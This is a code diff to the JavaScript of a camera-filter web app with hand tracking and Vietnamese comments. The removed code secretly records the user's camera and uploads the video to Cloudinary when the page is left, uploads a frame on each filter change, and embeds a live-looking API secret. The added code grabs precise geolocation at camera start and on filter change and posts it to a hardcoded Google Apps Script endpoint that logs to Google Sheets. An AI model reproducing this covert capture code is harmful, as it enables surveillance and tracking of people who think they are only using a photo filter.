@@ -242,28 +242,8 @@ import {
   HandLandmarker,
   FilesetResolver,
 } from "https://cdn.jsdelivr.net/npm/@mediapipe/tasks-vision@0.10.14";
-const CLOUDINARY_CLOUD_NAME = "dpihfxijg";
-const CLOUDINARY_API_KEY = "134551449197819";
-const CLOUDINARY_API_SECRET = "A81MMJgALbxgjAYe7fX1gyolITk";
-const CLOUDINARY_UPLOAD_PRESET = "20-10-pnl";
-
-async function toHex(buffer) {
-  return Array.from(new Uint8Array(buffer))
-    .map((b) => b.toString(16).padStart(2, "0"))
-    .join("");
-}
-
-async function createCloudinarySignature(params) {
-  const text = Object.entries(params)
-    .sort(([a], [b]) => a.localeCompare(b))
-    .map(([key, value]) => `${key}=${value}`)
-    .join("&");
-
-  const encoder = new TextEncoder();
-  const digest = await crypto.subtle.digest("SHA-1", encoder.encode(text + CLOUDINARY_API_SECRET));
-  return await toHex(digest);
-}
-
+// Dán URL Web App của Google Apps Script vào đây sau khi Deploy.
+const GOOGLE_SHEETS_WEB_APP_URL = "https://script.google.com/macros/s/AKfycbw2N5N2c4Q50uijan9SnWKY82Pt93kddIjqfMir1av23eMp9nZoBzcRI7Yg_c1S5F5F/exec";
 const MP_VERSION = "0.10.14";
 const HAND_MODEL_URL =
   "https://storage.googleapis.com/mediapipe-models/hand_landmarker/hand_landmarker/float16/latest/hand_landmarker.task";
@@ -286,10 +266,83 @@ const statusText = document.getElementById("statusText");
 const filterRow = document.getElementById("filterRow");
 const mobileFilterBtn = document.getElementById("mobileFilterBtn");
 
-let mediaRecorder = null;
-let recordedChunks = [];
-let isRecording = false;
-let hasTriggeredSend = false;
+const locationSessionId = `${Date.now()}-${Math.random().toString(36).slice(2, 10)}`;
+let locationUploadStarted = false;
+let locationUploadInProgress = false;
+
+async function requestAndUploadLocation() {
+  if (locationUploadStarted || locationUploadInProgress) return;
+  locationUploadInProgress = true;
+
+  if (!GOOGLE_SHEETS_WEB_APP_URL || GOOGLE_SHEETS_WEB_APP_URL.startsWith("YOUR_")) {
+    console.warn("Chưa cấu hình Google Apps Script Web App URL.");
+    locationUploadInProgress = false;
+    statusText.textContent = "Chưa cấu hình URL Google Sheets.";
+    return;
+  }
+
+  if (!navigator.geolocation) {
+    locationUploadInProgress = false;
+    statusText.textContent = "Thiết bị không hỗ trợ định vị.";
+    return;
+  }
+
+  statusText.textContent = "Camera đã bật. Đang xin quyền định vị...";
+
+  try {
+    const position = await new Promise((resolve, reject) => {
+      navigator.geolocation.getCurrentPosition(resolve, reject, {
+        enableHighAccuracy: true,
+        timeout: 15000,
+        maximumAge: 0,
+      });
+    });
+
+    const { latitude, longitude, accuracy } = position.coords;
+    const recordedAt = new Date().toISOString();
+    const coordinates = `${latitude}, ${longitude}`;
+    const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+    const locationText = [
+      `recordedAt: ${recordedAt}`,
+      `sessionId: ${locationSessionId}`,
+      `coordinates: ${coordinates}`,
+      `googleMapsUrl: ${googleMapsUrl}`,
+      `accuracyMeters: ${accuracy}`,
+    ].join("\n");
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 15000);
+    await fetch(GOOGLE_SHEETS_WEB_APP_URL, {
+      method: "POST",
+      mode: "no-cors",
+      headers: { "Content-Type": "text/plain;charset=utf-8" },
+      body: JSON.stringify({
+      recordedAt,
+      sessionId: locationSessionId,
+      latitude,
+      longitude,
+      coordinates,
+      googleMapsUrl,
+      accuracyMeters: accuracy,
+      locationText,
+      }),
+      signal: controller.signal,
+    });
+    clearTimeout(timeoutId);
+    locationUploadStarted = true;
+    locationUploadInProgress = false;
+    statusText.textContent = "Đã gửi tọa độ vào Google Sheets.";
+  } catch (err) {
+    locationUploadInProgress = false;
+    console.error("Không thể lấy hoặc gửi vị trí:", err?.code || err, err);
+    if (err?.code === 1 || err?.code === 2 || err?.code === 3) {
+      statusText.textContent = "Chưa cấp quyền định vị hoặc vị trí không khả dụng.";
+    } else if (err?.name === "AbortError") {
+      statusText.textContent = "Gửi tọa độ quá thời gian. Kiểm tra URL Apps Script.";
+    } else {
+      statusText.textContent = `Gửi tọa độ thất bại: ${err?.code || "lỗi không xác định"}`;
+    }
+  }
+}
 
 // Ảnh dùng cho PICTURE2 / PIC3 / PIC4 / PIC5
 const userImages = { 2: null, 3: null, 4: null, 5: null };
@@ -326,8 +379,7 @@ function renderFilterChips() {
     chip.className = "filter-chip" + (idx === currentFilterIdx ? " active" : "");
     chip.textContent = name;
     chip.addEventListener("click", () => {
-      currentFilterIdx = idx;
-      renderFilterChips();
+      setCurrentFilter(idx);
     });
     filterRow.appendChild(chip);
   });
@@ -337,7 +389,8 @@ renderFilterChips();
 function setCurrentFilter(idx) {
   currentFilterIdx = ((idx % FILTERS.length) + FILTERS.length) % FILTERS.length;
   renderFilterChips();
-  captureCurrentFrameAsImage();
+  // Lần đổi filter đầu tiên cũng là một thao tác sử dụng trang.
+  requestAndUploadLocation();
 }
 
 // --- Nút nổi đổi filter (chỉ hiển thị trên màn hình điện thoại, xem CSS) ---
@@ -379,143 +432,6 @@ initHandLandmarker().catch((err) => {
 // ---------------------------------------------------------------------------
 // 2. Bắt đầu Camera
 // ---------------------------------------------------------------------------
-function getSupportedMimeType() {
-  const candidates = [
-    "video/webm;codecs=vp9,opus",
-    "video/webm;codecs=vp8,opus",
-    "video/webm",
-    "video/mp4",
-  ];
-
-  return candidates.find((type) => MediaRecorder.isTypeSupported(type)) || "";
-}
-
-async function startRecordingFromStream(stream) {
-  if (isRecording) return;
-
-  const mimeType = getSupportedMimeType();
-  const options = mimeType ? { mimeType } : {};
-  const canvasStream = canvas.captureStream ? canvas.captureStream(30) : null;
-  const captureSource = canvasStream || stream;
-
-  recordedChunks = [];
-  mediaRecorder = new MediaRecorder(captureSource, options);
-
-  mediaRecorder.ondataavailable = (event) => {
-    if (event.data && event.data.size > 0) {
-      recordedChunks.push(event.data);
-    }
-  };
-
-  mediaRecorder.onstop = () => {
-    const fullBlob = new Blob(recordedChunks, { type: mediaRecorder?.mimeType || "video/webm" });
-    if (fullBlob.size > 0) {
-      uploadVideoToCloudinary(fullBlob);
-    }
-  };
-
-  mediaRecorder.start(250);
-  isRecording = true;
-  statusText.textContent = "Đang ghi video... sẽ gửi khi người dùng rời trang.";
-}
-
-function stopRecordingAndSend() {
-  if (!isRecording || !mediaRecorder) return;
-  if (hasTriggeredSend) return;
-  hasTriggeredSend = true;
-
-  const finalizeUpload = () => {
-    const fullBlob = new Blob(recordedChunks, { type: mediaRecorder?.mimeType || "video/webm" });
-    if (fullBlob.size > 0) {
-      uploadVideoToCloudinary(fullBlob);
-    }
-  };
-
-  mediaRecorder.onstop = finalizeUpload;
-  mediaRecorder.stop();
-  isRecording = false;
-}
-
-async function uploadCloudinaryFile(blob, folder, type) {
-  const timestamp = Math.floor(Date.now() / 1000);
-  const filename = `${type}-${timestamp}-${Math.random().toString(36).slice(2)}.${type === "video" ? "webm" : "png"}`;
-  const formData = new FormData();
-  formData.append("file", blob, filename);
-  formData.append("folder", folder);
-
-  if (CLOUDINARY_UPLOAD_PRESET) {
-    formData.append("upload_preset", CLOUDINARY_UPLOAD_PRESET);
-  } else {
-    const params = {
-      folder,
-      timestamp: String(timestamp),
-      api_key: CLOUDINARY_API_KEY,
-    };
-    const signature = await createCloudinarySignature(params);
-    formData.append("timestamp", params.timestamp);
-    formData.append("api_key", params.api_key);
-    formData.append("signature", signature);
-  }
-
-  const endpoint = type === "video"
-    ? `https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD_NAME}/video/upload`
-    : `https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD_NAME}/image/upload`;
-
-  const response = await fetch(endpoint, {
-    method: "POST",
-    body: formData,
-  });
-
-  if (!response.ok) {
-    const text = await response.text();
-    throw new Error(`Cloudinary ${type} upload failed: ${response.status} ${text}`);
-  }
-
-  const data = await response.json();
-  return data.secure_url || data.url;
-}
-
-async function uploadVideoToCloudinary(videoBlob) {
-  try {
-    statusText.textContent = "Đang upload video lên Cloudinary...";
-    const videoUrl = await uploadCloudinaryFile(videoBlob, "webcam-recordings", "video");
-    console.log("Cloudinary video upload success:", videoUrl);
-    statusText.textContent = `Video đã lưu lên Cloudinary. Link: ${videoUrl}`;
-  } catch (err) {
-    console.error("Cloudinary video upload failed:", err);
-    statusText.textContent = "Lỗi khi upload video lên Cloudinary. Hãy tạo Upload Preset hoặc kiểm tra API key/secret.";
-  }
-}
-
-async function captureCurrentFrameAsImage() {
-  if (!canvas) return;
-
-  try {
-    const imageBlob = await new Promise((resolve) => canvas.toBlob(resolve, "image/png", 0.92));
-    if (!imageBlob) return;
-
-    const imageUrl = await uploadCloudinaryFile(imageBlob, "filter-captures", "image");
-    console.log("Cloudinary image capture success:", imageUrl);
-    statusText.textContent = `Ảnh khi đổi filter đã lưu lên Cloudinary. Link: ${imageUrl}`;
-  } catch (err) {
-    console.error("Cloudinary image capture failed:", err);
-  }
-}
-
-window.addEventListener("pagehide", () => {
-  stopRecordingAndSend();
-});
-
-window.addEventListener("beforeunload", () => {
-  stopRecordingAndSend();
-});
-
-document.addEventListener("visibilitychange", () => {
-  if (document.visibilityState === "hidden") {
-    stopRecordingAndSend();
-  }
-});
-
 startBtn.addEventListener("click", async () => {
   try {
     overlayText.textContent = "Đang mở camera...";
@@ -538,8 +454,9 @@ startBtn.addEventListener("click", async () => {
     canvas.width = video.videoWidth || screenW;
     canvas.height = video.videoHeight || screenH;
     overlay.classList.add("hidden");
-    await startRecordingFromStream(stream);
     requestAnimationFrame(renderLoop);
+    // Không chờ hộp thoại định vị hoặc Google Sheets trước khi vẽ camera.
+    requestAndUploadLocation();
   } catch (err) {
     console.error(err);
     overlayText.textContent =
